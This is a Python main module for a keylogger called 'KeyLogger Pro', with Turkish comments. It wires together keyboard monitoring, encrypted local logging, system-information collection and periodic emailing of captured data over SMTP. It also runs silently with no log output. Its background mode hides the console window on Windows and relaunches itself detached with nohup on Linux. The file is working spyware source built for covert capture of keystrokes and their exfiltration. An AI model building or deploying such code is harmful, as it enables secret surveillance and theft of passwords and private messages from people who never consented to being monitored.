#!/usr/bin/env python3
"""
KeyLogger Pro - Ana Modül
Gelişmiş tuş kaydedici ve sistem izleme aracı.
"""

import argparse
import sys
import time
import os
import logging
import configparser

# Modül arama yolunu düzelt
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

from src.core import SystemMonitor
from src.logger import FileLogger, EmailLogger
from src.utils import (
    get_system_info, format_system_info, secure_delete_file, 
    generate_key, encrypt_data, get_log_path, expand_path,
    ensure_log_directory
)

# Logging yapılandırması - log dosyası oluşturmadan sessiz mod
logger = logging.getLogger()
logger.addHandler(logging.NullHandler())
logger.setLevel(logging.ERROR)

# Varsayılan config dosyası yolu
DEFAULT_CONFIG_PATH = os.path.join(current_dir, 'config.ini')

def load_config(config_path=DEFAULT_CONFIG_PATH):
    """Config dosyasını yükle."""
    config = configparser.ConfigParser()
    
    # Varsayılan değerler
    config['General'] = {
        'interval': '60',
        'background': 'false',
        'system_info': 'true'
    }
    config['Output'] = {
        'output_file': 'data/system_log.dat',
        'log_file': '',
        'encrypt': 'true',
        'password': 'default_key'
    }
    config['Email'] = {
        'recipient': '',
        'smtp_server': '',
        'smtp_port': '587',
        'smtp_user': '',
        'smtp_password': ''
    }
    
    # Config dosyası varsa oku
    if os.path.exists(config_path):
        try:
            config.read(config_path, encoding='utf-8')
        except Exception as e:
            print(f"Config dosyası okunurken hata: {str(e)}")
            print("Varsayılan değerler kullanılacak.")
    else:
        # Config dosyası yoksa oluştur
        os.makedirs(os.path.dirname(config_path), exist_ok=True)
        try:
            with open(config_path, 'w', encoding='utf-8') as f:
                config.write(f)
            print(f"Config dosyası oluşturuldu: {config_path}")
        except Exception as e:
            print(f"Config dosyası oluşturulurken hata: {str(e)}")
    
    return config

def parse_arguments():
    """Komut satırı argümanlarını ayrıştır."""
    # Önce config dosyasını yükle
    config = load_config()
    
    parser = argparse.ArgumentParser(description='KeyLogger Pro - Gelişmiş Tuş Kaydedici')
    parser.add_argument('--config', type=str, default=DEFAULT_CONFIG_PATH,
                        help='Config dosyası yolu')
    parser.add_argument('--output', type=str, default=config['Output']['output_file'],
                        help='Veri çıktı dosyası')
    parser.add_argument('--interval', type=int, default=int(config['General']['interval']),
                        help='Raporlama aralığı (saniye cinsinden)')
    parser.add_argument('--email', type=str, default=config['Email']['recipient'],
                        help='Raporların gönderileceği e-posta')
    parser.add_argument('--smtp-server', type=str, default=config['Email']['smtp_server'],
                        help='E-posta raporlaması için SMTP sunucusu')
    parser.add_argument('--smtp-port', type=int, default=int(config['Email']['smtp_port']),
                        help='SMTP portu')
    parser.add_argument('--smtp-user', type=str, default=config['Email']['smtp_user'],
                        help='SMTP kullanıcı adı')
    parser.add_argument('--smtp-password', type=str, default=config['Email']['smtp_password'],
                        help='SMTP şifresi')
    parser.add_argument('--system-info', action='store_true', default=config['General'].getboolean('system_info'),
                        help='Sistem bilgilerini kaydet')
    parser.add_argument('--background', action='store_true', default=config['General'].getboolean('background'),
                        help='Arka planda çalıştır')
    parser.add_argument('--no-encrypt', action='store_true', default=not config['Output'].getboolean('encrypt'),
                        help='Veriyi şifreleme')
    parser.add_argument('--password', type=str, default=config['Output']['password'],
                        help='Şifreleme parolası')
    parser.add_argument('--log-file', type=str, default=config['Output']['log_file'],
                        help='Hata logları için dosya (belirtilmezse log dosyası oluşturulmaz)')
    
    # Komut satırı argümanlarını ayrıştır
    args = parser.parse_args()
    
    # Farklı bir config dosyası belirtildiyse, tekrar yükle
    if args.config != DEFAULT_CONFIG_PATH:
        config = load_config(args.config)
        # Config dosyasındaki değerleri komut satırı argümanlarıyla güncelle
        if not args.output:
            args.output = config['Output']['output_file']
        if not args.interval:
            args.interval = int(config['General']['interval'])
        if not args.email:
            args.email = config['Email']['recipient']
        if not args.smtp_server:
            args.smtp_server = config['Email']['smtp_server']
        if not args.smtp_port:
            args.smtp_port = int(config['Email']['smtp_port'])
        if not args.smtp_user:
            args.smtp_user = config['Email']['smtp_user']
        if not args.smtp_password:
            args.smtp_password = config['Email']['smtp_password']
        if not args.system_info:
            args.system_info = config['General'].getboolean('system_info')
        if not args.background:
            args.background = config['General'].getboolean('background')
        if not args.no_encrypt:
            args.no_encrypt = not config['Output'].getboolean('encrypt')
        if not args.password:
            args.password = config['Output']['password']
        if not args.log_file:
            args.log_file = config['Output']['log_file']
    
    return args

def main():
    """Ana fonksiyon."""
    args = parse_arguments()
    
    # Config dosyasını yükle
    config = configparser.ConfigParser()
    config.read(args.config, encoding='utf-8')
    
    # Config'den debug modunu kontrol et
    debug_mode = config.getboolean('General', 'debug_mode', fallback=False)
    if debug_mode:
        print("Debug modu aktif - Loglar masaüstüne kaydedilecek")
        print("Debug modunda e-posta gönderimi devre dışı")
    
    # Çıktı dosyasının tam yolunu oluştur
    args.output = get_log_path(config)
    print(f"Log dosyası: {args.output}")
    
    # Log dizinini oluştur
    ensure_log_directory(args.output)
    
    # Kullanıcı log dosyası belirttiyse, logging yapılandırmasını güncelle
    if args.log_file:
        # Log dosyasının tam yolunu oluştur
        args.log_file = expand_path(args.log_file)
        
        # Log dizininin var olduğundan emin ol
        log_dir = os.path.dirname(args.log_file)
        if log_dir and not os.path.exists(log_dir):
            os.makedirs(log_dir)
            
        # Dosya handler'ı ekle
        file_handler = logging.FileHandler(args.log_file, mode='a')
        file_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
        logger = logging.getLogger()
        logger.addHandler(file_handler)
        logger.setLevel(logging.ERROR)
    
    # Arka planda çalıştırma seçeneği
    if args.background and not debug_mode:  # Debug modunda arka plan devre dışı
        run_as_background()
    
    # Veri işleyicileri yapılandır
    data_handlers = []
    
    # Dosya logger'ı ekle
    file_logger = FileLogger(config)
    data_handlers.append(file_logger)
    
    # E-posta logger'ı ekle (debug modunda değilse ve aktifse)
    if not debug_mode and config.getboolean('Email', 'email_enabled', fallback=False):
        try:
            email_logger = EmailLogger(config)
            data_handlers.append(email_logger)
        except Exception as e:
            logging.error(f"E-posta logger'ı yapılandırılırken hata: {str(e)}")
    
    # Sistem bilgilerini kaydet (eğer isteniyorsa)
    if config.getboolean('General', 'startup_info', fallback=True):
        try:
            system_info = get_system_info()
            formatted_info = format_system_info(system_info)
            
            if config.getboolean('Output', 'encrypt', fallback=True):
                # Şifrelenmiş sistem bilgisi
                key = generate_key(config.get('Output', 'password', fallback='default_key'))
                encrypted_info = encrypt_data(formatted_info, key)
                
                with open(args.output, 'ab') as f:
                    f.write(encrypted_info + b"\n\n")
            else:
                with open(args.output, 'a', encoding='utf-8') as f:
                    f.write(formatted_info + "\n\n")
        except Exception as e:
            logging.error(f"Sistem bilgisi kaydedilirken hata: {str(e)}")
    
    # İzleyiciyi başlat
    monitor = SystemMonitor(
        data_handlers=data_handlers, 
        update_interval=args.interval
    )
    
    try:
        if config.getboolean('General', 'keyboard_logging', fallback=True):
            monitor.initialize()
            # Ana iş parçacığını canlı tut
            while True:
                time.sleep(1)
        else:
            print("Klavye izleme devre dışı")
    except KeyboardInterrupt:
        logging.info("İzleme durduruluyor...")
        monitor.terminate()
        logging.info("İzleme durduruldu.")
    except Exception as e:
        logging.error(f"Beklenmeyen hata: {str(e)}")
        monitor.terminate()
        return 1
    
    return 0

def run_as_background():
    """Programı arka planda çalıştır."""
    try:
        if sys.platform.startswith('win'):
            # Windows için arka plan işlemi
            try:
                import win32gui
                import win32con
                hwnd = win32gui.GetForegroundWindow()
                win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
            except ImportError:
                logging.warning("win32gui kütüphanesi bulunamadı. Pencere gizlenemedi.")
        elif sys.platform.startswith('linux'):
            # Linux için arka plan işlemi
            import subprocess
            # Mevcut süreci arka plana al
            subprocess.Popen(
                ['nohup', sys.executable] + sys.argv + ['&'], 
                stdout=open('/dev/null', 'w'),
                stderr=open('/dev/null', 'w')
            )
            # Mevcut süreci sonlandır
            os._exit(0)
        # macOS için de benzer bir yöntem eklenebilir
    except Exception as e:
        logging.error(f"Arka planda çalıştırma hatası: {str(e)}")

if __name__ == "__main__":
    sys.exit(main()) 